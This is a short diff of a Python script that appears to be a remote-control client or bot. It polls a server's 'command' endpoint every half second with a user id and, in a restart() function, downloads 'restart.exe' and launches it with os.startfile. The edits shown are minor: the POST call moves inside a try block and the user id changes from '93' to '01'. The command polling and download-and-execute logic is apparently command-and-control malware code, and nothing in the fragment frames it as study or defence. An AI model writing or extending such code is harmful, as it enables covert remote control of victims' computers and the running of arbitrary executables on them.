@@ -24,10 +24,10 @@ if not os.path.exists("assets"):
     os.mkdir("assets")
 
 def hit(url:str,data=None):
-    if data:
-        return rq.post(url,json=data)
     try:
         if not terminate:
+            if data:
+                return rq.post(url,json=data)
             return rq.get(url,stream=True)
     except:
         return "none"
@@ -119,7 +119,7 @@ def restart():
             for chunk in exe.iter_content(chunk_size=8192):
                 if chunk:
                     file.write(chunk)
-                    downloaded_size += len(chunk)
+                    downloaded_size += len(chunk) 
     os.startfile("restart.exe")
     terminate = True
 
@@ -157,7 +157,7 @@ def display(fp:str):
 def main():
     while not terminate:
         sleep(0.5)
-        cmd = hit(url+"command",data={"user":"93"})
+        cmd = hit(url+"command",data={"user":"01"})
         if type(cmd) != str:
             cmd = cmd.content.decode("utf-8")
         print(cmd)
